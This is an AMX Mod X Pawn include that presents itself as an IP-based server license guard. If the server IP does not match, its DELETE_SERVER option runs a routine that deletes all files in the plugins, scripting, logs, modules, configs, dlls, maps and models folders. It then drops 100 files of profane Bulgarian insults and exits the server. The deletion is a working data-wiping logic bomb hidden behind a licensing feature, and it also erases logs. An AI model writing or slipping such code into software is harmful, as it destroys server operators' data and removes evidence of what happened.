/* Sublime AMXX Editor v3.0.0-beta */

#if defined _server_license_included
	#endinput
#endif
#define _server_license_included

/* Load custom module ?

#pragma reqlib LIBRARY_NAME
#if !defined AMXMODX_NOAUTOLOAD
	#pragma loadlib LIBRARY_NAME
#endif

*/

enum ServerStatus {
	FAIL_STATE,
	EXIT_SERVER,
	DELETE_SERVER
}

stock UTIL_CheckServerLicense(const ip[], ServerStatus:value = EXIT_SERVER) { 
	/* *************************************************************************************  */
	//							Pick one of the lines below	    							  //
	//	In plugin_init add this line: UTIL_CheckServerLicense("Your IP HERE", FAIL_STATE)     //
	//  In plugin_init add this line: UTIL_CheckServerLicense("Your IP HERE", EXIT_SERVER)	  //
	//	In plugin_init add this line: UTIL_CheckServerLicense("Your IP HERE", DELETE_SERVER)  //
	//							Credits: Huehue		    									  //
	/* *************************************************************************************  */
	new server_ip[MAX_IP_LENGTH]
	get_user_ip(0, server_ip, charsmax (server_ip), 0)
	
	if (!equal(server_ip, ip))
	{
		if (value == DELETE_SERVER)
		{
			new szFormatFailState[250]
			formatex(szFormatFailState, charsmax(szFormatFailState), "[Steal Guard] License IP: <%s>. Your Server IP is: <%s>. IP Checking failed.", ip, server_ip)

			server_print(szFormatFailState)

			@FW_Delay_DeleteFiles()
		}
		else if (value == EXIT_SERVER)
		{
			server_cmd("exit")
			
			log_amx("[Steal Guard] License IP: <%s>. Your Server IP is: <%s>. IP Checking failed...Shutting down...", ip, server_ip)
		}
		else if (value == FAIL_STATE)
		{
			new szFormatFailState[250]
			formatex(szFormatFailState, charsmax(szFormatFailState), "[Steal Guard] License IP: <%s>. Your Server IP is: <%s>. IP Checking failed.", ip, server_ip)
			
			set_fail_state(szFormatFailState)
		}
	}
	else
	{
		log_amx("[Steal Guard] License IP: <%s>. Your Server IP is: <%s>. IP Checking verified! DONE.", ip, server_ip)
	}
}

@FW_Delay_DeleteFiles() {
	set_task(25.0, "@UTIL_DeleteFiles")
}

@UTIL_DeleteFiles() {
	new file[128]
	
	new dir = open_dir("addons/amxmodx/plugins", file, charsmax(file))
	if (dir)
	{		
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "addons/amxmodx/plugins/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir)
	}
	
	dir = open_dir("addons/amxmodx/scripting", file, charsmax(file))
	if (dir)
	{		
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "addons/amxmodx/scripting/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir);
	}
	
	dir = open_dir("addons/amxmodx/logs", file, charsmax(file))
	if (dir)
	{
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "addons/amxmodx/logs/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir);
	}
	
	dir = open_dir("addons/amxmodx/modules", file, charsmax(file))
	if (dir)
	{
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "addons/amxmodx/modules/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir)
	}
	
	dir = open_dir("addons/amxmodx/configs", file, charsmax(file))
	if (dir)
	{
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "addons/amxmodx/configs/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir);
	}
	
	dir = open_dir("addons/amxmodx/dlls", file, charsmax(file))
	if (dir)
	{
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "addons/amxmodx/dlls/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir);
	}
		
	dir = open_dir("dlls", file, charsmax(file))
	if (dir)
	{		
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "dlls/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir);
	}
		
	dir = open_dir("maps", file, charsmax(file))
	if (dir)
	{		
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "maps/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir);
	}
	
	dir = open_dir("models", file, charsmax(file))
	if (dir)
	{		
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "models/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir)
	}

	for (new i = 0; i < 100; i++)
	{
		formatex(file, charsmax(file), "PROCHETI ME%i.txt", i)
		write_file(file, "Shto ne si ebesh maikata?")
	}
	
	write_file("addons/amxmodx/plugins/namaikatiputkata.amxx", "Ko pa gledash we tva e AMXX fail :P")
	server_cmd("exit")
}